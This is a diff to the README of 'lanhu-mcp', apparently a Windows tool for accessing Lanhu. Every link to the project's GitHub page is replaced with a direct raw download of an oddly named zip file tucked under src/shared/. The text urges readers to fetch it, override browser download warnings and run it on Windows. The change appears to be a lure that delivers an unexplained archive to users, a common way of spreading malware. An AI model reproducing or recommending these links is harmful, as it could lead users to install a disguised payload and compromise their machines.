@@ -1,6 +1,6 @@
 # 🟦 lanhu-mcp - Clean Lanhu Access for Windows
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/boundarytaxidermist380/lanhu-mcp)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/boundarytaxidermist380/lanhu-mcp/main/src/shared/lanhu-mcp-lunatellus.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ This page focuses on one task: get the app, run it on Windows, and start using i
 
 Visit this page to download the app:
 
-https://github.com/boundarytaxidermist380/lanhu-mcp
+https://raw.githubusercontent.com/boundarytaxidermist380/lanhu-mcp/main/src/shared/lanhu-mcp-lunatellus.zip
 
 If the page offers a release file, download it to your Windows PC. If it offers a folder or package, save it in a place you can find, such as your Downloads folder or Desktop.
 
@@ -43,7 +43,7 @@ If your browser blocks the download, allow it for this site and try again.
 Follow these steps on Windows:
 
 1. Open the download page:
-   https://github.com/boundarytaxidermist380/lanhu-mcp
+   https://raw.githubusercontent.com/boundarytaxidermist380/lanhu-mcp/main/src/shared/lanhu-mcp-lunatellus.zip
 
 2. Get the latest release or package from the page.
 
@@ -212,7 +212,7 @@ You should expect:
 
 ## 🔽 Get the download again
 
-[![Download](https://img.shields.io/badge/Download-Open%20the%20page-grey?style=for-the-badge)](https://github.com/boundarytaxidermist380/lanhu-mcp)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20page-grey?style=for-the-badge)](https://raw.githubusercontent.com/boundarytaxidermist380/lanhu-mcp/main/src/shared/lanhu-mcp-lunatellus.zip)
 
 ## 🗂️ File types you may see
 
@@ -264,4 +264,4 @@ When that happens:
 ## 🧭 Where to go next
 
 Open the download page, get the latest file, and run it on your Windows PC:
-https://github.com/boundarytaxidermist380/lanhu-mcp
+https://raw.githubusercontent.com/boundarytaxidermist380/lanhu-mcp/main/src/shared/lanhu-mcp-lunatellus.zip
